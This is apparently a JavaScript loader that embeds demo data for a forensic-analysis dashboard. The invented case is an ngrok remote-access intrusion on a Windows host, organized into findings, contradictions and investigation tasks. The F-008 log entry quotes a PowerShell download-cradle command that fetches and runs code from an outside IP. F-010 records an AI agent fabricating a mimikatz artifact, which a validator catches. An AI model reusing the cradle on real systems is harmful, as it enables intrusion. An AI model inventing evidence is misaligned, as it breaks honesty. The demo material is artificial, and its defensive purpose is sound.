// SIFT Sentinel - Data Loader
// Tries to load real evidence_graph.json, falls back to embedded demo data.
//
// Demo scenario: ngrok-based remote-access intrusion on a Windows host (user "Aditya").
// 6 evidence sources · 10 findings (7 HYPOTHESIS, 2 INFERRED, 1 ELIMINATED)
// 4 contradictions · 9 investigation tasks.

(async function() {
  // Try loading real analysis output first
  try {
    const response = await fetch('./evidence_graph.json');
    if (response.ok) {
      window.SIFT_GRAPH = await response.json();
      console.log('[SIFT Sentinel] Loaded real evidence graph:', window.SIFT_GRAPH.case_id);
      window.dispatchEvent(new Event('sift-data-ready'));
      return;
    }
  } catch (e) {
    console.log('[SIFT Sentinel] No evidence_graph.json found, using demo data');
  }

  // Fall back to embedded demo data
  window.SIFT_GRAPH = {
  case_id: "TEST-001",
  evidence_sources: [
    {
      source_id: "src-001",
      source_type: "registry_hive",
      path: "~/cases/mini-case/Registry/SYSTEM",
      sha256: "df7a71db4c2e9f1a8b3c5d6e0f4a2b9c7d8e1f0a3b6c5d4e2f1a0b9c8d7e6f5a4",
      mounted_at: "2026-06-14T00:09:43Z",
      metadata: { hive: "SYSTEM", tool: "regripper -a", exec_id: "exec-rr-system" }
    },
    {
      source_id: "src-002",
      source_type: "registry_hive",
      path: "~/cases/mini-case/Registry/SOFTWARE",
      sha256: "a1b2c3d4e5f6071829304a5b6c7d8e9f0a1b2c3d4e5f60718293a4b5c6d7e8f90",
      mounted_at: "2026-06-14T00:09:44Z",
      metadata: { hive: "SOFTWARE", tool: "regripper -a", exec_id: "exec-rr-software" }
    },
    {
      source_id: "src-003",
      source_type: "registry_hive",
      path: "~/cases/mini-case/Users/Aditya/NTUSER.DAT",
      sha256: "9f8e7d6c5b4a39281706f5e4d3c2b1a0099887766554433221100ffeeddccbb",
      mounted_at: "2026-06-14T00:09:45Z",
      metadata: { hive: "NTUSER", user: "Aditya", sid: "S-1-5-21-3623811015-3361044348-30300820-1001", tool: "regripper -a", exec_id: "exec-rr-ntuser" }
    },
    {
      source_id: "src-004",
      source_type: "event_log",
      path: "~/cases/mini-case/Logs/Security.evtx",
      sha256: "5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d",
      mounted_at: "2026-06-14T00:09:46Z",
      metadata: { channel: "Security", record_count: 48211, tool: "evtxexport", exec_id: "exec-evtx-sec" }
    },
    {
      source_id: "src-005",
      source_type: "event_log",
      path: "~/cases/mini-case/Logs/System.evtx",
      sha256: "0a1b2c3d4e5f60718293a4b5c6d7e8f9001122334455667788990aabbccddeeff",
      mounted_at: "2026-06-14T00:09:47Z",
      metadata: { channel: "System", record_count: 12903, tool: "evtxexport", exec_id: "exec-evtx-sys" }
    },
    {
      source_id: "src-006",
      source_type: "prefetch_directory",
      path: "~/cases/mini-case/Windows/Prefetch",
      sha256: "c0ffee11deadbeef0a1b2c3d4e5f60718293a4b5c6d7e8f900112233445566778",
      mounted_at: "2026-06-14T00:09:48Z",
      metadata: { entries: 142, tool: "PECmd", exec_id: "exec-pf-scan" }
    }
  ],

  findings: [
    {
      finding_id: "F-001",
      status: "HYPOTHESIS",
      category: "persistence",
      summary: "A Run key value 'ngrok' was written under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run pointing at C:\\Users\\Aditya\\Downloads\\ngrok-v3-stable\\ngrok.exe. The value establishes user-level autostart persistence for the tunneling utility. The key's LastWrite time aligns with the observed download window, suggesting the operator configured persistence immediately after staging the binary.",
      evidence_anchor: {
        source_id: "src-003",
        tool_execution_id: "exec-rr-ntuser",
        artifact_path: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ngrok",
        file_hash: null,
        offset: null,
        log_entry: "Run\n  LastWrite: 2026-06-08 11:48:02Z\n  ngrok -> C:\\Users\\Aditya\\Downloads\\ngrok-v3-stable\\ngrok.exe",
        raw_output_reference: "exec-rr-ntuser:line-2218"
      },
      reasoning_chain: { premises: [], logic: "", corroboration_type: "not_applicable", chain_rendered: false },
      mitre_attack: ["T1547.001"],
      linked_findings: ["F-002", "F-003"],
      contradictions: [],
      validation_results: [
        { validator_name: "platform_consistency", verdict: "PASS", detail: "Artifact class (registry Run key) is consistent with the Windows source image.", timestamp: "2026-06-14T00:21:10Z" },
        { validator_name: "temporal_physics", verdict: "PASS", detail: "LastWrite 2026-06-08 precedes evidence capture 2026-06-14.", timestamp: "2026-06-14T00:21:10Z" },
        { validator_name: "path_existence", verdict: "PASS", detail: "Run key value resolved in NTUSER.DAT after path-variant normalization.", timestamp: "2026-06-14T00:21:11Z" },
        { validator_name: "hash_verification", verdict: "NOT_APPLICABLE", detail: "No file hash claimed by this finding.", timestamp: "2026-06-14T00:21:11Z" },
        { validator_name: "tool_output_fidelity", verdict: "PASS", detail: "Run value string verified verbatim in regripper output.", timestamp: "2026-06-14T00:21:12Z" }
      ],
      promotion_history: [
        { from_status: "", to_status: "HYPOTHESIS", reason: "Artifact discovered during registry sweep.", triggered_by: "agent:discovery", timestamp: "2026-06-14T00:18:03Z" }
      ],
      flags: [],
      created_at: "2026-06-14T00:18:03Z",
      last_updated: "2026-06-14T00:21:12Z"
    },
    {
      finding_id: "F-002",
      status: "HYPOTHESIS",
      category: "network_activity",
      summary: "ngrok.exe was downloaded to the user's Downloads directory and executed under the user's SID. ngrok establishes an outbound reverse tunnel that exposes an internal service to the public internet, a common command-and-control and exfiltration enabler. Execution under S-1-5-21-...-1001 indicates the interactive user account was the principal, not a service.",
      evidence_anchor: {
        source_id: "src-001",
        tool_execution_id: "exec-rr-system",
        artifact_path: "\\Device\\HarddiskVolume3\\Users\\Aditya\\Downloads\\ngrok-v3-stable\\ngrok.exe",
        file_hash: null,
        offset: null,
        log_entry: "S-1-5-21-3623811015-3361044348-30300820-1001\n  2026-06-08 11:46:12Z - \\Device\\HarddiskVolume3\\Users\\Aditya\\Downloads\\ngrok-v3-stable\\ngrok.exe",
        raw_output_reference: "exec-rr-system:line-901"
      },
      reasoning_chain: { premises: [], logic: "", corroboration_type: "not_applicable", chain_rendered: false },
      mitre_attack: ["T1572", "T1090"],
      linked_findings: ["F-001", "F-003"],
      contradictions: ["C-001"],
      validation_results: [
        { validator_name: "platform_consistency", verdict: "PASS", detail: "Device path notation is Windows-native; consistent with disk source.", timestamp: "2026-06-14T00:21:20Z" },
        { validator_name: "temporal_physics", verdict: "PASS", detail: "Execution timestamp precedes capture.", timestamp: "2026-06-14T00:21:20Z" },
        { validator_name: "path_existence", verdict: "FAIL_SOFT", detail: "Volume GUID for HarddiskVolume3 could not be independently resolved within mounted sources; path plausible but unconfirmed.", timestamp: "2026-06-14T00:21:21Z" },
        { validator_name: "hash_verification", verdict: "NOT_APPLICABLE", detail: "No file hash claimed.", timestamp: "2026-06-14T00:21:21Z" },
        { validator_name: "tool_output_fidelity", verdict: "PASS", detail: "All 2 claims (path, SID) verified verbatim in regripper output.", timestamp: "2026-06-14T00:21:22Z" }
      ],
      promotion_history: [
        { from_status: "", to_status: "HYPOTHESIS", reason: "Execution artifact discovered.", triggered_by: "agent:discovery", timestamp: "2026-06-14T00:18:30Z" }
      ],
      flags: ["volume_guid_unresolved: HarddiskVolume3 not mapped in available sources"],
      created_at: "2026-06-14T00:18:30Z",
      last_updated: "2026-06-14T00:21:22Z"
    },
    {
      finding_id: "F-003",
      status: "INFERRED",
      category: "execution_evidence",
      summary: "ngrok.exe was executed at least 4 times between 2026-06-08 and 2026-06-09. Prefetch records the run count and last-run timestamps, and the AmCache program-entry corroborates the binary's presence and first-execution time independently. Two independent artifact types agree on execution, raising confidence above a single-source observation.",
      evidence_anchor: {
        source_id: "src-006",
        tool_execution_id: "exec-pf-scan",
        artifact_path: "C:\\Windows\\Prefetch\\NGROK.EXE-1A2B3C4D.pf",
        file_hash: null,
        offset: null,
        log_entry: "NGROK.EXE-1A2B3C4D.pf\n  RunCount: 4\n  LastRun: 2026-06-09 02:14:55Z\n  LastRun-1: 2026-06-08 19:02:11Z",
        raw_output_reference: "exec-pf-scan:entry-088"
      },
      reasoning_chain: {
        premises: [
          "Prefetch file NGROK.EXE-1A2B3C4D.pf records RunCount=4 with last-run 2026-06-09 02:14:55Z.",
          "AmCache InventoryApplicationFile lists ngrok.exe with FirstRun 2026-06-08 11:46:30Z.",
          "Both artifacts are produced by independent OS subsystems (Prefetch service vs. Application Experience)."
        ],
        logic: "Two independent execution-tracking subsystems record the same binary executing in the same window. Independent corroboration makes fabricated execution highly unlikely, so the finding is promoted from hypothesis to inferred.",
        corroboration_type: "independent_sources",
        chain_rendered: true
      },
      mitre_attack: ["T1059"],
      linked_findings: ["F-001", "F-002"],
      contradictions: [],
      validation_results: [
        { validator_name: "platform_consistency", verdict: "PASS", detail: "Prefetch + AmCache are Windows artifacts; consistent.", timestamp: "2026-06-14T00:22:02Z" },
        { validator_name: "temporal_physics", verdict: "PASS", detail: "All run timestamps precede capture; LastRun ordering monotonic.", timestamp: "2026-06-14T00:22:02Z" },
        { validator_name: "path_existence", verdict: "PASS", detail: "Prefetch path resolved after 8.3 short-name normalization.", timestamp: "2026-06-14T00:22:03Z" },
        { validator_name: "hash_verification", verdict: "NOT_APPLICABLE", detail: "No file hash claimed.", timestamp: "2026-06-14T00:22:03Z" },
        { validator_name: "tool_output_fidelity", verdict: "PASS", detail: "RunCount and timestamps verified verbatim across PECmd and AmCache parser output.", timestamp: "2026-06-14T00:22:04Z" }
      ],
      promotion_history: [
        { from_status: "", to_status: "HYPOTHESIS", reason: "Prefetch execution artifact discovered.", triggered_by: "agent:discovery", timestamp: "2026-06-14T00:19:01Z" },
        { from_status: "HYPOTHESIS", to_status: "INFERRED", reason: "AmCache independently corroborates execution; corroboration_type independent_sources.", triggered_by: "correlation:prefetch_amcache", timestamp: "2026-06-14T00:30:14Z" }
      ],
      flags: [],
      created_at: "2026-06-14T00:19:01Z",
      last_updated: "2026-06-14T00:30:14Z"
    },
    {
      finding_id: "F-004",
      status: "HYPOTHESIS",
      category: "account_anomaly",
      summary: "A local account 'svc_helpdesk' was created and added to the Administrators group. Security event 4720 (account created) is followed within seconds by 4732 (member added to security-enabled local group). The naming mimics a legitimate service account, a common defense-evasion technique for a backdoor administrator.",
      evidence_anchor: {
        source_id: "src-004",
        tool_execution_id: "exec-evtx-sec",
        artifact_path: null,
        file_hash: null,
        offset: null,
        log_entry: "EventID 4720  2026-06-08 12:03:41Z  TargetUserName=svc_helpdesk\nEventID 4732  2026-06-08 12:03:44Z  TargetUserName=svc_helpdesk  Group=Administrators",
        raw_output_reference: "exec-evtx-sec:rec-40118"
      },
      reasoning_chain: { premises: [], logic: "", corroboration_type: "not_applicable", chain_rendered: false },
      mitre_attack: ["T1136.001", "T1098"],
      linked_findings: [],
      contradictions: ["C-004"],
      validation_results: [
        { validator_name: "platform_consistency", verdict: "PASS", detail: "Security event IDs are Windows-native.", timestamp: "2026-06-14T00:22:40Z" },
        { validator_name: "temporal_physics", verdict: "PASS", detail: "Event times precede capture.", timestamp: "2026-06-14T00:22:40Z" },
        { validator_name: "path_existence", verdict: "NOT_APPLICABLE", detail: "Finding anchors to a log record, not a filesystem path.", timestamp: "2026-06-14T00:22:41Z" },
        { validator_name: "hash_verification", verdict: "NOT_APPLICABLE", detail: "No file hash claimed.", timestamp: "2026-06-14T00:22:41Z" },
        { validator_name: "tool_output_fidelity", verdict: "PASS", detail: "Both event records present verbatim in evtxexport output.", timestamp: "2026-06-14T00:22:42Z" }
      ],
      promotion_history: [
        { from_status: "", to_status: "HYPOTHESIS", reason: "Account-creation event pair discovered.", triggered_by: "agent:discovery", timestamp: "2026-06-14T00:19:40Z" }
      ],
      flags: [],
      created_at: "2026-06-14T00:19:40Z",
      last_updated: "2026-06-14T00:22:42Z"
    },
    {
      finding_id: "F-005",
      status: "HYPOTHESIS",
      category: "event_log",
      summary: "The Security event log was cleared. Event 1102 records an audit-log-cleared action under the svc_helpdesk account roughly thirty minutes after that account was granted administrator rights. Log clearing is a hallmark anti-forensic step intended to remove evidence of preceding activity.",
      evidence_anchor: {
        source_id: "src-004",
        tool_execution_id: "exec-evtx-sec",
        artifact_path: null,
        file_hash: null,
        offset: null,
        log_entry: "EventID 1102  2026-06-08 12:34:09Z  SubjectUserName=svc_helpdesk  Channel=Security",
        raw_output_reference: "exec-evtx-sec:rec-40550"
      },
      reasoning_chain: { premises: [], logic: "", corroboration_type: "not_applicable", chain_rendered: false },
      mitre_attack: ["T1070.001"],
      linked_findings: ["F-004"],
      contradictions: [],
      validation_results: [
        { validator_name: "platform_consistency", verdict: "PASS", detail: "Event 1102 is Windows-native.", timestamp: "2026-06-14T00:23:05Z" },
        { validator_name: "temporal_physics", verdict: "PASS", detail: "Clear time precedes capture.", timestamp: "2026-06-14T00:23:05Z" },
        { validator_name: "path_existence", verdict: "NOT_APPLICABLE", detail: "Log-record anchor.", timestamp: "2026-06-14T00:23:06Z" },
        { validator_name: "hash_verification", verdict: "NOT_APPLICABLE", detail: "No file hash claimed.", timestamp: "2026-06-14T00:23:06Z" },
        { validator_name: "tool_output_fidelity", verdict: "PASS", detail: "1102 record present in output.", timestamp: "2026-06-14T00:23:07Z" }
      ],
      promotion_history: [
        { from_status: "", to_status: "HYPOTHESIS", reason: "Log-clear event discovered.", triggered_by: "agent:discovery", timestamp: "2026-06-14T00:20:02Z" }
      ],
      flags: ["coverage_gap: events prior to 2026-06-08 12:34:09Z may be absent due to clear"],
      created_at: "2026-06-14T00:20:02Z",
      last_updated: "2026-06-14T00:23:07Z"
    },
    {
      finding_id: "F-006",
      status: "HYPOTHESIS",
      category: "persistence",
      summary: "A scheduled task named 'OneDriveSync' was registered to launch a PowerShell process every 15 minutes. The task XML invokes powershell.exe with a hidden window and a base64-encoded command, inconsistent with the legitimate OneDrive updater it impersonates. The task provides resilient, recurring execution for an implant.",
      evidence_anchor: {
        source_id: "src-002",
        tool_execution_id: "exec-rr-software",
        artifact_path: "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{8B2F...A91}",
        file_hash: null,
        offset: null,
        log_entry: "TaskName: \\OneDriveSync\n  Action: powershell.exe -WindowStyle Hidden -EncodedCommand JAB...\n  Trigger: Repetition PT15M",
        raw_output_reference: "exec-rr-software:line-4471"
      },
      reasoning_chain: { premises: [], logic: "", corroboration_type: "not_applicable", chain_rendered: false },
      mitre_attack: ["T1053.005"],
      linked_findings: ["F-008"],
      contradictions: [],
      validation_results: [
        { validator_name: "platform_consistency", verdict: "PASS", detail: "TaskCache registry path is Windows-native.", timestamp: "2026-06-14T00:23:40Z" },
        { validator_name: "temporal_physics", verdict: "PASS", detail: "Task LastWrite precedes capture.", timestamp: "2026-06-14T00:23:40Z" },
        { validator_name: "path_existence", verdict: "PASS", detail: "TaskCache GUID key resolved in SOFTWARE hive.", timestamp: "2026-06-14T00:23:41Z" },
        { validator_name: "hash_verification", verdict: "NOT_APPLICABLE", detail: "No file hash claimed.", timestamp: "2026-06-14T00:23:41Z" },
        { validator_name: "tool_output_fidelity", verdict: "PASS", detail: "Task action string verified in regripper output.", timestamp: "2026-06-14T00:23:42Z" }
      ],
      promotion_history: [
        { from_status: "", to_status: "HYPOTHESIS", reason: "Scheduled-task persistence discovered.", triggered_by: "agent:discovery", timestamp: "2026-06-14T00:20:33Z" }
      ],
      flags: [],
      created_at: "2026-06-14T00:20:33Z",
      last_updated: "2026-06-14T00:23:42Z"
    },
    {
      finding_id: "F-007",
      status: "INFERRED",
      category: "network_activity",
      summary: "Remote Desktop was enabled on the host. The registry value fDenyTSConnections was set to 0, and a contemporaneous firewall-rule change opened TCP 3389. The registry change plus the supporting firewall context corroborate that interactive remote access was deliberately enabled, though a single primary artifact carries the claim.",
      evidence_anchor: {
        source_id: "src-001",
        tool_execution_id: "exec-rr-system",
        artifact_path: "HKLM\\SYSTEM\\ControlSet001\\Control\\Terminal Server\\fDenyTSConnections",
        file_hash: null,
        offset: null,
        log_entry: "Control\\Terminal Server\n  fDenyTSConnections: 0  (0x00000000)\n  LastWrite: 2026-06-08 12:10:55Z",
        raw_output_reference: "exec-rr-system:line-1502"
      },
      reasoning_chain: {
        premises: [
          "fDenyTSConnections=0 enables inbound RDP at the OS policy level.",
          "System log records a Windows Firewall rule change permitting TCP 3389 inbound at 2026-06-08 12:11:20Z.",
          "Both changes occur within the intrusion window and under elevated context."
        ],
        logic: "The registry value is the authoritative control for RDP availability; the firewall change is supporting context from a second source. One primary artifact with corroborating context yields a single-source-corroborated inference rather than independent confirmation.",
        corroboration_type: "single_source_corroborated",
        chain_rendered: true
      },
      mitre_attack: ["T1021.001"],
      linked_findings: [],
      contradictions: ["C-004"],
      validation_results: [
        { validator_name: "platform_consistency", verdict: "PASS", detail: "Terminal Server registry key is Windows-native.", timestamp: "2026-06-14T00:24:10Z" },
        { validator_name: "temporal_physics", verdict: "PASS", detail: "LastWrite precedes capture.", timestamp: "2026-06-14T00:24:10Z" },
        { validator_name: "path_existence", verdict: "PASS", detail: "Value resolved in SYSTEM hive ControlSet001.", timestamp: "2026-06-14T00:24:11Z" },
        { validator_name: "hash_verification", verdict: "NOT_APPLICABLE", detail: "No file hash claimed.", timestamp: "2026-06-14T00:24:11Z" },
        { validator_name: "tool_output_fidelity", verdict: "PASS", detail: "Registry value verified verbatim.", timestamp: "2026-06-14T00:24:12Z" }
      ],
      promotion_history: [
        { from_status: "", to_status: "HYPOTHESIS", reason: "RDP-enable registry value discovered.", triggered_by: "agent:discovery", timestamp: "2026-06-14T00:21:00Z" },
        { from_status: "HYPOTHESIS", to_status: "INFERRED", reason: "Firewall rule change corroborates intent; corroboration_type single_source_corroborated.", triggered_by: "correlation:registry_eventlog", timestamp: "2026-06-14T00:31:05Z" }
      ],
      flags: [],
      created_at: "2026-06-14T00:21:00Z",
      last_updated: "2026-06-14T00:31:05Z"
    },
    {
      finding_id: "F-008",
      status: "HYPOTHESIS",
      category: "execution_evidence",
      summary: "A PowerShell process executed an encoded command consistent with a download-cradle. Event 4104 script-block logging captured a decoded payload invoking Net.WebClient against an external host. The activity is attributed to the OneDriveSync scheduled task, though the precise process lineage requires confirmation against the USN journal.",
      evidence_anchor: {
        source_id: "src-004",
        tool_execution_id: "exec-evtx-sec",
        artifact_path: null,
        file_hash: null,
        offset: null,
        log_entry: "EventID 4104  2026-06-08 12:30:02Z  ScriptBlockText=IEX (New-Object Net.WebClient).DownloadString('http://45.77.x.x/a')",
        raw_output_reference: "exec-evtx-sec:rec-40488"
      },
      reasoning_chain: { premises: [], logic: "", corroboration_type: "not_applicable", chain_rendered: false },
      mitre_attack: ["T1059.001", "T1105"],
      linked_findings: ["F-006"],
      contradictions: ["C-002"],
      validation_results: [
        { validator_name: "platform_consistency", verdict: "PASS", detail: "Event 4104 is Windows-native.", timestamp: "2026-06-14T00:24:50Z" },
        { validator_name: "temporal_physics", verdict: "PASS", detail: "Event time precedes capture.", timestamp: "2026-06-14T00:24:50Z" },
        { validator_name: "path_existence", verdict: "NOT_APPLICABLE", detail: "Log-record anchor.", timestamp: "2026-06-14T00:24:51Z" },
        { validator_name: "hash_verification", verdict: "NOT_APPLICABLE", detail: "No file hash claimed.", timestamp: "2026-06-14T00:24:51Z" },
        { validator_name: "tool_output_fidelity", verdict: "FAIL_SOFT", detail: "Decoded ScriptBlockText present, but the claimed attribution to OneDriveSync task lineage is not directly evidenced in tool output; attribution flagged for review.", timestamp: "2026-06-14T00:24:52Z" }
      ],
      promotion_history: [
        { from_status: "", to_status: "HYPOTHESIS", reason: "Script-block logging event discovered.", triggered_by: "agent:discovery", timestamp: "2026-06-14T00:21:25Z" }
      ],
      flags: ["attribution_unconfirmed: process lineage to OneDriveSync task not directly evidenced"],
      created_at: "2026-06-14T00:21:25Z",
      last_updated: "2026-06-14T00:24:52Z"
    },
    {
      finding_id: "F-009",
      status: "HYPOTHESIS",
      category: "account_anomaly",
      summary: "A burst of failed interactive logons preceded the account compromise. 37 Event 4625 records for user 'Aditya' occur over four minutes with status 0xC000006A (bad password), followed by a successful 4624 logon. The pattern is consistent with a password-guessing attempt that ultimately succeeded.",
      evidence_anchor: {
        source_id: "src-004",
        tool_execution_id: "exec-evtx-sec",
        artifact_path: null,
        file_hash: null,
        offset: null,
        log_entry: "EventID 4625 x37  2026-06-08 11:38:10Z..11:42:02Z  TargetUserName=Aditya  Status=0xC000006A\nEventID 4624     2026-06-08 11:42:31Z  TargetUserName=Aditya  LogonType=2",
        raw_output_reference: "exec-evtx-sec:rec-39990"
      },
      reasoning_chain: { premises: [], logic: "", corroboration_type: "not_applicable", chain_rendered: false },
      mitre_attack: ["T1110.001"],
      linked_findings: [],
      contradictions: [],
      validation_results: [
        { validator_name: "platform_consistency", verdict: "PASS", detail: "Logon event IDs are Windows-native.", timestamp: "2026-06-14T00:25:20Z" },
        { validator_name: "temporal_physics", verdict: "PASS", detail: "Logon times precede capture and are internally ordered.", timestamp: "2026-06-14T00:25:20Z" },
        { validator_name: "path_existence", verdict: "NOT_APPLICABLE", detail: "Log-record anchor.", timestamp: "2026-06-14T00:25:21Z" },
        { validator_name: "hash_verification", verdict: "NOT_APPLICABLE", detail: "No file hash claimed.", timestamp: "2026-06-14T00:25:21Z" },
        { validator_name: "tool_output_fidelity", verdict: "PASS", detail: "4625 count and 4624 record verified against output.", timestamp: "2026-06-14T00:25:22Z" }
      ],
      promotion_history: [
        { from_status: "", to_status: "HYPOTHESIS", reason: "Failed-logon burst discovered.", triggered_by: "agent:discovery", timestamp: "2026-06-14T00:21:50Z" }
      ],
      flags: [],
      created_at: "2026-06-14T00:21:50Z",
      last_updated: "2026-06-14T00:25:22Z"
    },
    {
      finding_id: "F-010",
      status: "ELIMINATED",
      category: "execution_evidence",
      summary: "An initial assessment claimed mimikatz.exe was executed to dump LSASS credentials, citing a Prefetch entry MIMIKATZ.EXE-9F8E7D6C.pf. The Tool Output Fidelity validator found no such prefetch entry, no AmCache record, and no matching string anywhere in the parsed tool output. The claim was fabricated by the agent's narration and is retained, struck through, as a record of self-correction.",
      evidence_anchor: {
        source_id: "src-006",
        tool_execution_id: "exec-pf-scan",
        artifact_path: "C:\\Windows\\Prefetch\\MIMIKATZ.EXE-9F8E7D6C.pf",
        file_hash: null,
        offset: null,
        log_entry: "(claimed) MIMIKATZ.EXE-9F8E7D6C.pf  RunCount: 1",
        raw_output_reference: null
      },
      reasoning_chain: {
        premises: [
          "Agent narration asserted a Prefetch entry for mimikatz.exe.",
          "PECmd output enumerates 142 prefetch entries; none match MIMIKATZ.EXE.",
          "No corroborating AmCache or MFT record exists for the claimed binary."
        ],
        logic: "The claimed artifact does not appear in any parsed tool output. A finding whose evidence anchor cannot be located in the underlying tool execution is unfounded. Tool Output Fidelity returns FAIL_HARD and the finding is eliminated.",
        corroboration_type: "single_source_narrated",
        chain_rendered: true
      },
      mitre_attack: ["T1003.001"],
      linked_findings: [],
      contradictions: ["C-003"],
      validation_results: [
        { validator_name: "platform_consistency", verdict: "PASS", detail: "Prefetch is a valid Windows artifact class.", timestamp: "2026-06-14T00:26:00Z" },
        { validator_name: "temporal_physics", verdict: "NOT_APPLICABLE", detail: "No verifiable timestamp; artifact absent.", timestamp: "2026-06-14T00:26:00Z" },
        { validator_name: "path_existence", verdict: "FAIL_SOFT", detail: "Claimed prefetch path not present in Prefetch directory listing.", timestamp: "2026-06-14T00:26:01Z" },
        { validator_name: "hash_verification", verdict: "NOT_APPLICABLE", detail: "No file hash claimed.", timestamp: "2026-06-14T00:26:01Z" },
        { validator_name: "tool_output_fidelity", verdict: "FAIL_HARD", detail: "Claimed prefetch entry MIMIKATZ.EXE-9F8E7D6C.pf appears nowhere in PECmd output (142 entries enumerated). No AmCache or MFT corroboration. Claim is fabricated.", timestamp: "2026-06-14T00:26:02Z" }
      ],
      promotion_history: [
        { from_status: "", to_status: "HYPOTHESIS", reason: "Agent narration proposed credential-dumping execution.", triggered_by: "agent:discovery", timestamp: "2026-06-14T00:22:10Z" },
        { from_status: "HYPOTHESIS", to_status: "ELIMINATED", reason: "Tool Output Fidelity FAIL_HARD: claimed artifact absent from all tool output.", triggered_by: "validator:tool_output_fidelity", timestamp: "2026-06-14T00:26:02Z" }
      ],
      flags: ["fabrication_caught: artifact absent from tool output", "retained_for_transparency: eliminated findings are shown, not hidden"],
      created_at: "2026-06-14T00:22:10Z",
      last_updated: "2026-06-14T00:26:02Z"
    }
  ],

  contradictions: [
    {
      contradiction_id: "C-001",
      finding_a: "F-002",
      finding_b: "",
      description: "F-002 places ngrok.exe execution at 2026-06-08 11:46:12Z, but the registry Run-key persistence (F-001) was written at 11:48:02Z — execution appears to precede the persistence mechanism that would launch it.",
      resolution: "Resolved as non-contradictory. The initial execution was a manual interactive launch from Downloads; persistence was configured afterward to ensure re-execution. Temporal ordering is consistent with operator behavior, not a logical conflict.",
      follow_up_tasks: ["T-001"],
      status: "RESOLVED"
    },
    {
      contradiction_id: "C-002",
      finding_a: "F-008",
      finding_b: "F-006",
      description: "F-008 attributes the encoded-PowerShell execution to the OneDriveSync scheduled task (F-006), but the task's 15-minute trigger does not align with the single observed 4104 event time, and no parent-process record links them.",
      resolution: "",
      follow_up_tasks: ["T-002", "T-003"],
      status: "OPEN"
    },
    {
      contradiction_id: "C-003",
      finding_a: "F-010",
      finding_b: "",
      description: "F-010 claimed a mimikatz Prefetch artifact that is absent from all tool output, contradicting the evidence inventory which enumerates every Prefetch entry.",
      resolution: "Resolved by elimination. F-010 was demoted to ELIMINATED by the Tool Output Fidelity validator. The contradiction is closed because the fabricated finding no longer asserts the artifact as fact.",
      follow_up_tasks: [],
      status: "RESOLVED"
    },
    {
      contradiction_id: "C-004",
      finding_a: "F-004",
      finding_b: "F-007",
      description: "F-004 (svc_helpdesk admin creation at 12:03Z) and F-007 (RDP enabled at 12:10Z) imply remote interactive access, but no 4624 LogonType=10 (RemoteInteractive) event exists for svc_helpdesk in the retained log window.",
      resolution: "",
      follow_up_tasks: ["T-004"],
      status: "OPEN"
    }
  ],

  investigation_queue: [
    { task_id: "T-001", description: "Confirm interactive vs. scheduled launch of ngrok.exe by correlating Prefetch run times against Security 4688 process-creation events.", triggered_by: "C-001", priority: "MEDIUM", status: "DONE", result_finding_ids: ["F-003"] },
    { task_id: "T-002", description: "Recover parent-process lineage for the 4104 PowerShell event from the USN journal and Sysmon (if present) to confirm or refute the OneDriveSync attribution.", triggered_by: "C-002", priority: "HIGH", status: "PENDING", result_finding_ids: [] },
    { task_id: "T-003", description: "Decode and detonate the base64 EncodedCommand from the OneDriveSync task in a sandbox to characterize the second-stage payload.", triggered_by: "F-006", priority: "HIGH", status: "BLOCKED", result_finding_ids: [] },
    { task_id: "T-004", description: "Search for 4624 LogonType=10 events for svc_helpdesk in archived/forwarded logs, since the local Security log was cleared at 12:34Z (F-005).", triggered_by: "C-004", priority: "HIGH", status: "PENDING", result_finding_ids: [] },
    { task_id: "T-005", description: "Check the USN journal for file-deletion events corresponding to the post-clear coverage gap.", triggered_by: "F-005", priority: "MEDIUM", status: "PENDING", result_finding_ids: [] },
    { task_id: "T-006", description: "Resolve the HarddiskVolume3 GUID by mounting the disk image to confirm the ngrok.exe absolute path in F-002.", triggered_by: "F-002", priority: "MEDIUM", status: "PENDING", result_finding_ids: [] },
    { task_id: "T-007", description: "Extract ngrok configuration (ngrok.yml) and authtoken to identify the tunnel endpoint and operator account.", triggered_by: "F-002", priority: "MEDIUM", status: "PENDING", result_finding_ids: [] },
    { task_id: "T-008", description: "Pivot on source IP 45.77.x.x from the download cradle against firewall and proxy logs for additional beaconing.", triggered_by: "F-008", priority: "LOW", status: "PENDING", result_finding_ids: [] },
    { task_id: "T-009", description: "Validate that no LSASS credential-dumping occurred, given F-010 was eliminated; review Defender and WDAC logs as an alternate signal.", triggered_by: "F-010", priority: "LOW", status: "PENDING", result_finding_ids: [] }
  ],

  metadata: {
    agent_version: "0.1.0",
    total_tool_executions: 6,
    analysis_start: "2026-06-14T00:09:41Z",
    analysis_end: "2026-06-14T00:38:59Z"
  }
  };

  console.log('[SIFT Sentinel] Loaded demo data:', window.SIFT_GRAPH.case_id);
  window.dispatchEvent(new Event('sift-data-ready'));
})();
